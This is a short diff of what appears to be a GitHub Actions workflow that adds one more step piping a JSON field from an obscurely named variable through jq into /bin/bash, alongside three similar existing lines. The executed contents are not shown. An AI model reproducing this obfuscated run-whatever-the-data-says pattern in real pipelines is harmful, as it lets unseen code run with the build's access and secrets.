@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$rt85" | jq -r .dbno60 | /bin/bash
           printf '%s' "$dn04" | jq -r .lei591 | /bin/bash
           echo $hid1156 | jq -r .ch29 | /bin/bash
+          echo $asftr221 | jq -r .krik4 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
